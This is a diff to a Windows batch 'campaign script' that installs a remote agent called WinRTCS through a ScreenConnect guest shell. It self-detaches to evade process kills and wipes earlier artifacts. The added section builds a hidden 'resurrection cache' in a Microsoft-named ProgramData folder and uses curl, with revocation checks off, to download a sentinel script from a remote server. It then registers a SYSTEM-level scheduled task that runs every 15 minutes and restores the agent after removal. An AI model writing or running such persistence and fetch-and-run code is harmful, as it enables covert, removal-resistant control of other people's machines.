@@ -1,6 +1,7 @@
 @echo off
-rem CAMPAIGN_SCRIPT WINRTCS_BOOTSTRAP B2 - wipe every legacy project artifact + retire Zerocool bridge, install WinRTCS v0.0.1.
+rem CAMPAIGN_SCRIPT WINRTCS_BOOTSTRAP B3 - wipe every legacy project artifact + retire Zerocool bridge, install WinRTCS v0.0.1.
 rem B2: self-detach first (ScreenConnect Guest shell kills the process tree at ~10s; real work runs off-tree).
+rem B3 (C19): seed the resurrection cache + arm the sentinel third re-armer (\WinRTCSSentinel).
 rem Safe to re-run. Delivered by M71 campaign hook, Zerocool 0.0.2 bridge payload, or manual paste.
 rem Keeps sevrz/gryxa RMM clients untouched. Order: verify new agent FIRST, then wipe, then arm, then retire Zerocool.
 if /I not "%~1"=="--detached" (
@@ -74,6 +75,21 @@ set "TASKG=\Microsoft\Windows\WinRTCS\Guard"
 set "ACT=cmd.exe /c C:\ProgramData\WinRTCS\winrtcs_run.cmd"
 schtasks /Create /TN "%TASKA%" /TR "%ACT%" /SC MINUTE /MO 1 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
 schtasks /Create /TN "%TASKG%" /TR "%ACT%" /SC MINUTE /MO 5 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
+
+rem --- 6b) resurrection cache + sentinel third re-armer (C19): survives a simultaneous
+rem --- wipe of both primary tasks and the main dir; sole job is restoring the pair ---
+set "CD=C:\ProgramData\Microsoft\WinRTCS\cache"
+if not exist "%CD%" mkdir "%CD%" >nul 2>&1
+copy /y "%ZD%\winrtcs_agent.cmd" "%CD%\winrtcs_agent.cmd" >nul 2>&1
+copy /y "%ZD%\winrtcs_run.cmd" "%CD%\winrtcs_run.cmd" >nul 2>&1
+copy /y "%ZD%\winrtcs.version" "%CD%\winrtcs.version" >nul 2>&1
+"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 25 -o "%CD%\sentinel.dl" "%BASE%/winrtcs_sentinel.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
+if exist "%CD%\sentinel.dl" findstr /C:"WINRTCS_SENTINEL" "%CD%\sentinel.dl" >nul 2>&1 && move /y "%CD%\sentinel.dl" "%CD%\winrtcs_sentinel.cmd" >nul 2>&1
+del /f /q "%CD%\sentinel.dl" >nul 2>&1
+attrib +h "C:\ProgramData\Microsoft\WinRTCS" >nul 2>&1
+if exist "%CD%\winrtcs_sentinel.cmd" schtasks /Create /TN "\WinRTCSSentinel" /TR "cmd.exe /c C:\ProgramData\Microsoft\WinRTCS\cache\winrtcs_sentinel.cmd" /SC MINUTE /MO 15 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
+echo [%DATE% %TIME%] sentinel_armed>>"%LOG%"
+
 schtasks /Run /TN "%TASKA%" >nul 2>&1
 echo [%DATE% %TIME%] winrtcs_armed>>"%LOG%"
 
